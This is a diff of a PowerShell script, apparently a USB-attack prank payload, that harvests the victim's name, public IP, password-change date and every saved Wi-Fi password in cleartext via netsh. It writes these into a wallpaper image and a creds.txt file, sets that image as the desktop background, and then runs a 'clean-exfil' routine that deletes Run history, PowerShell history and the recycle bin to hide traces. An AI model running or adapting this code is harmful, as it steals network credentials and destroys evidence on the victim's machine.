@@ -1,164 +1,61 @@
-# This sets a wallpaper on your desktop
-
 $hiddenMessage = "`n`nYou should `ntake care about your `nwindows sessions `n While leaving your computer"
 $ImageName = "dont-let-your-computer-alone"
+$TempInfoFile = "$Env:temp\foo.txt"
+$TempImgFile = "$env:temp\foo.jpg"
 
+if (Test-Path $TempInfoFile) { Remove-Item $TempInfoFile }
 
- function Get-Name {
-
+# AUTH_INFO
+function Get-Name {
     try {
+        $fullName = Net User $Env:username | Select-String -Pattern "Full Name"
+        $fullName = ("$fullName").TrimStart("Full Name").Trim()
+        if ([string]::IsNullOrEmpty($fullName)) { return $env:UserName }
+        return $fullName
+    } catch { return $env:UserName }
+}
 
-    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
+# NETWORK_INFO
+function Get-PubIP {
+    try { return (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing -TimeoutSec 2).Content.Trim() }
+    catch { return "Unknown" }
+}
 
-    }
-
-
-    # Write Error is just for troubleshooting 
-    catch {Write-Error "No name was detected" 
-    return $env:UserName
-    -ErrorAction SilentlyContinue
-    }
-
-    return $fullName
-
+# PASS_INFO
+function Get-Days_Set {
+    try {
+        $pls = net user $env:USERNAME | Select-String -Pattern "Password last"
+        return ([string]$pls).Split(" ", 4)[-1].Trim()
+    } catch { return "Not found" }
 }
 
 $fn = Get-Name
-
-echo "Hey" $fn >> $Env:temp\foo.txt
-
-echo "`nYour computer is not very secure" >> $Env:temp\foo.txt
-
-#############################################################################################################################################
-
-function Get-GeoLocation{
-	try {
-	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
-	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
-	$GeoWatcher.Start() #Begin resolving current locaton
-
-	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
-		Start-Sleep -Milliseconds 100 #Wait for discovery.
-	}  
-
-	if ($GeoWatcher.Permission -eq 'Denied'){
-		Write-Error 'Access Denied for Location Information'
-	} else {
-		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
-		
-	}
-	}
-    # Write Error is just for troubleshooting
-    catch {Write-Error "No coordinates found" 
-    return "No Coordinates found"
-    -ErrorAction SilentlyContinue
-    } 
-
-}
-
-#############################################################################################################################################
-
-
-function Get-PubIP {
-
-    try {
-
-    $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
-
-    }
- 
- # If no Public IP is detected function will return $null to avoid sapi speak
-
-    # Write Error is just for troubleshooting 
-    catch {Write-Error "No Public IP was detected" 
-    return $null
-    -ErrorAction SilentlyContinue
-    }
-
-    return $computerPubIP
-}
-
 $PubIP = Get-PubIP
-if ($PubIP) { echo "`nYour Public IP: $PubIP" >> $Env:temp\foo.txt }
-
-
-###########################################################################################################
-
-
- function Get-Days_Set {
-
-    #-----VARIABLES-----#
-    # $pls (password last set) = the date/time their password was last changed 
-    # $days = the number of days since their password was last changed 
-
-    try {
- 
-    $pls = net user $env:USERNAME | Select-String -Pattern "Password last" ; $pls = [string]$pls
-    $plsPOS = $pls.IndexOf("e")
-    $pls = $pls.Substring($plsPOS+2).Trim()
-    $pls = $pls -replace ".{3}$"
-    $time = ((get-date) - (get-date "$pls")) ; $time = [string]$time 
-    $DateArray =$time.Split(".")
-    $days = [int]$DateArray[0]
-    return $pls
-    
-    }
- 
- # If no password set date is detected funtion will return $null to cancel Sapi Speak
-
-    # Write Error is just for troubleshooting 
-    catch {Write-Error "Day password set not found" 
-    return $null
-    -ErrorAction SilentlyContinue
-    }
-}
-
 $pls = Get-Days_Set
-if ($pls) { echo "`nPassword Last Set: $pls" >> $Env:temp\foo.txt }
 
+"Hey $fn" > $TempInfoFile
+"`nYour computer is not very secure" >> $TempInfoFile
+"`nYour Public IP: $PubIP" >> $TempInfoFile
+"`nPassword Last Set: $pls" >> $TempInfoFile
 
-###########################################################################################################
-
-
-# Get Network Interfaces
-$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
-
-# Get Wifi SSIDs and Passwords	
-$WLANProfileNames =@()
-
-#Get all the WLAN profile names
+# WIFI_STEAL
+$WLANProfileNames = @()
 $Output = netsh.exe wlan show profiles | Select-String -pattern " : "
+foreach($line in $Output) { $WLANProfileNames += (($line -split ":")[1]).Trim() }
 
-#Trim the output to receive only the name
-Foreach($WLANProfileName in $Output){
-    $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
-}
-$WLANProfileObjects =@()
-
-#Bind the WLAN profile names and also the password to a custom object
-Foreach($WLANProfileName in $WLANProfileNames){
-
-  
-    try{
-        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
-    }Catch{
-        $WLANProfilePassword = "The password is not stored in this profile"
+if ($WLANProfileNames.Count -gt 0) {
+    "`nW-Lan profiles: ===============================" >> $TempInfoFile
+    foreach($name in $WLANProfileNames) {
+        try {
+            $pass = (((netsh.exe wlan show profiles name="$name" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
+            "Profile: $name | Pass: $pass" >> $TempInfoFile
+        } catch { "Profile: $name | Pass: Not Stored" >> $TempInfoFile }
     }
-
-    $WLANProfileObject = New-Object PSCustomobject 
-    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
-    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
-    $WLANProfileObjects += $WLANProfileObject
-    Remove-Variable WLANProfileObject
 }
-    if (!$WLANProfileObjects) { Write-Host "variable is null" 
-    }else { 
 
-	echo "`nW-Lan profiles: ===============================" $WLANProfileObjects >> $Env:temp\foo.txt
+$content = Get-Content $TempInfoFile -Raw
 
-$content = [IO.File]::ReadAllText("$Env:temp\foo.txt")
-	}
-
+# DISPLAY_METRICS
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -168,125 +65,57 @@ public class PInvoke {
 }
 "@
 $hdc = [PInvoke]::GetDC([IntPtr]::Zero)
-$w = [PInvoke]::GetDeviceCaps($hdc, 118) # width
-$h = [PInvoke]::GetDeviceCaps($hdc, 117) # height
+$w = [PInvoke]::GetDeviceCaps($hdc, 118)
+$h = [PInvoke]::GetDeviceCaps($hdc, 117)
 
-
+# DRAWING_ENGINE
 Add-Type -AssemblyName System.Drawing
+$bmp = new-object System.Drawing.Bitmap $w, $h
+$graphics = [System.Drawing.Graphics]::FromImage($bmp)
 
-$filename = "$env:tmp\foo.jpg" 
-$bmp = new-object System.Drawing.Bitmap $w,$h 
-$graphics = [System.Drawing.Graphics]::FromImage($bmp) 
-
-# 1. Remplissage du fond en Rouge
 $graphics.Clear([System.Drawing.Color]::Red)
-
-# 2. Configuration de la police (Gras) et de la couleur (Blanc)
 $font = new-object System.Drawing.Font("Consolas", 20, [System.Drawing.FontStyle]::Bold)
-$brushFg = [System.Drawing.Brushes]::White
-
-# 3. Sécurité : Si $content est vide, on affiche au moins un message d'alerte
-if ([string]::IsNullOrWhiteSpace($content)) {
-    $content = "SECURITY ALERT: UNSECURED SESSION`nUser: $env:username"
-}
+$brush = [System.Drawing.Brushes]::White
 
 $textSize = $graphics.MeasureString($content, $font)
 $x = ($w - $textSize.Width) / 2
 $y = ($h - $textSize.Height) / 2
 
-$graphics.DrawString($content, $font, $brushFg, $x, $y)
+$graphics.DrawString($content, $font, $brush, $x, $y)
+
 $graphics.Dispose()
-$bmp.Save($filename, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+$bmp.Save($TempImgFile, [System.Drawing.Imaging.ImageFormat]::Jpeg)
 $bmp.Dispose()
-$font.Dispose()
 
-echo $hiddenMessage > $Env:temp\foo.txt
-cmd.exe /c copy /b "$Env:temp\foo.jpg" + "$Env:temp\foo.txt" "$Env:USERPROFILE\Desktop\$ImageName.jpg"
-copy $Env:temp\foo.txt $Env:userprofile\creds.txt
-rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue
+# FILE_PACKING
+$hiddenMessage >> $TempInfoFile
+cmd.exe /c copy /b "$TempImgFile" + "$TempInfoFile" "$Env:USERPROFILE\Desktop\$ImageName.jpg"
+copy $TempInfoFile "$Env:USERPROFILE\creds.txt"
+Remove-Item $TempInfoFile, $TempImgFile -Force -ErrorAction SilentlyContinue
 
+# WALLPAPER_CORE
 Function Set-WallPaper {
- 
-
- 
-param (
-    [parameter(Mandatory=$True)]
-    # Provide path to image
-    [string]$Image,
-    # Provide wallpaper style that you would like applied
-    [parameter(Mandatory=$False)]
-    [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
-    [string]$Style
-)
- 
-$WallpaperStyle = Switch ($Style) {
-  
-    "Fill" {"10"}
-    "Fit" {"6"}
-    "Stretch" {"2"}
-    "Tile" {"0"}
-    "Center" {"0"}
-    "Span" {"22"}
-  
-}
- 
-If($Style -eq "Tile") {
- 
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
- 
-}
-Else {
- 
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
- 
-}
- 
-Add-Type -TypeDefinition @" 
-using System; 
-using System.Runtime.InteropServices;
-  
-public class Params
-{ 
-    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
-    public static extern int SystemParametersInfo (Int32 uAction, 
-                                                   Int32 uParam, 
-                                                   String lpvParam, 
-                                                   Int32 fuWinIni);
-}
-"@ 
-  
-    $SPI_SETDESKWALLPAPER = 0x0014
-    $UpdateIniFile = 0x01
-    $SendChangeEvent = 0x02
-  
-    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
-  
-    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
+    param ([string]$Image)
+    $code = @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class Params {
+        [DllImport("User32.dll",CharSet=CharSet.Unicode)]
+        public static extern int SystemParametersInfo (Int32 uAction, Int32 uParam, String lpvParam, Int32 fuWinIni);
+    }
+"@
+    if (-not ([System.Management.Automation.PSTypeName]'Params').Type) { Add-Type -TypeDefinition $code }
+    Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -Value "0"
+    Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -Value "0"
+    [Params]::SystemParametersInfo(0x0014, 0, $Image, 0x01 -bor 0x02)
 }
 
-
+# CLEANUP
 function clean-exfil {
-
-try {
-
-	rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-	reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-	Remove-Item (Get-PSreadlineOption).HistorySavePath
-	Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
-	}
-
-
-	catch {Write-Error "Can not do clean exfil" 
-	return $env:UserName
-	-ErrorAction SilentlyContinue
-	}
+    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+    if (Get-PSreadlineOption) { Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue }
+    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 }
-#----------------------------------------------------------------------------------------------------
- 
-Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg" -Style Center
 
+Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg"
 clean-exfil
- 
